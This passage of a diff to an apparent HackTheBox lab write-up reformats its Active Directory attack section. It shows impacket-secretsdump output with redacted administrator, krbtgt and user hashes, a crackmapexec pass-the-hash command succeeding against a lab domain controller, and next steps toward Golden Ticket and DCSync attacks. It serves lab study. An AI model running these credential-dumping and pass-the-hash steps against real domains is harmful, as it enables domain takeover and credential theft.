 # [*] Starting service RemoteRegistry
@@ -9884,42 +11980,90 @@ impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1@172.16.119.11'
 # ...
 ```
 
+</td></tr>
+</table>
+
 **Critical Findings:**
+
 1. **Administrator Hash:**
-```bash
+
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>Text/Output</b> </td></tr>
+<tr><td colspan="2">
+
+```
 # Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMINISTRATOR_NTLM_HASH>:::
 ```
 
+</td></tr>
+</table>
+
 2. **KRBTGT Account Hash (Golden Ticket potential):**
-```bash
+
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>Text/Output</b> </td></tr>
+<tr><td colspan="2">
+
+```
 # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
 ```
 
+</td></tr>
+</table>
+
 3. **All User Hashes:**
-```bash
+
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>Text/Output</b> </td></tr>
+<tr><td colspan="2">
+
+```
 # nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:<BDAVID_NTLM_HASH>:::
 # nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:<STOM_NTLM_HASH>:::
 ```
 
+</td></tr>
+</table>
+
 4. **Kerberos Keys:**
-```bash
+
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>Text/Output</b> </td></tr>
+<tr><td colspan="2">
+
+```
 # Administrator:aes256-cts-hmac-sha1-96:<ADMINISTRATOR_AES_KEY>
 ```
 
+</td></tr>
+</table>
+
 **Use the extracted Administrator hash for validation** (Redacted)
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 crackmapexec smb 172.16.119.11 -u Administrator -H <ADMINISTRATOR_NTLM_HASH>
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">---
+
+```
 # SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False)
 # SMB         172.16.119.11   445    DC01             [+] nexura.htb\Administrator:<ADMINISTRATOR_NTLM_HASH> (Pwn3d!)
 ```
 
+</td></tr>
+</table>
+
 **Next Steps:**
 
-* Create Golden Ticket with krbtgt hash
-* Perform DCSync attacks
-* Begin network-wide compromise using extracted credentials
+- Create Golden Ticket with krbtgt hash
+- Perform DCSync attacks
+- Begin network-wide compromise using extracted credentials
 
 </details>
 
